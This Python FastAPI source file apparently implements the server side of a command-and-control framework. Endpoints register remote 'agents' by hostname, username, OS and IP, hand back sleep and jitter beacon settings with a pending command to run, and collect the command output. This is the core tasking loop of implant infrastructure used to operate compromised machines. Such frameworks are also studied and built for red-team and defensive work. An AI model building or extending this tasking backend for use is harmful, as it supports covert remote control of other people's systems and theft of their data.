from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from db.database import get_db
from models.agent import Agent
from models.task import Task
from pydantic import BaseModel
from datetime import datetime
from typing import Optional

router = APIRouter(prefix="/api/agents", tags=["agents"])

class AgentCheckin(BaseModel):
    hostname: str
    username: str
    os: str
    arch: str
    ip: str

class TaskResult(BaseModel):
    task_id: str
    output: str
    status: str

@router.post("/checkin")
def agent_checkin(data: AgentCheckin, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(
        Agent.hostname == data.hostname,
        Agent.username == data.username
    ).first()

    if not agent:
        agent = Agent(**data.model_dump())
        db.add(agent)
    else:
        agent.last_seen = datetime.utcnow()
        agent.is_active = True

    db.commit()
    db.refresh(agent)

    pending = db.query(Task).filter(
        Task.agent_id == agent.id,
        Task.status == "pending"
    ).first()

    return {
        "agent_id": agent.id,
        "sleep": agent.sleep,
        "jitter": agent.jitter,
        "task": {"id": pending.id, "command": pending.command} if pending else None
    }

@router.post("/{agent_id}/result")
def submit_result(agent_id: str, result: TaskResult, db: Session = Depends(get_db)):
    task = db.query(Task).filter(Task.id == result.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.output = result.output
    task.status = result.status
    task.completed_at = datetime.utcnow()
    db.commit()
    return {"status": "ok"}

@router.get("/")
def list_agents(db: Session = Depends(get_db)):
    return db.query(Agent).all()

@router.get("/{agent_id}/tasks")
def get_tasks(agent_id: str, db: Session = Depends(get_db)):
    return db.query(Task).filter(Task.agent_id == agent_id).all()
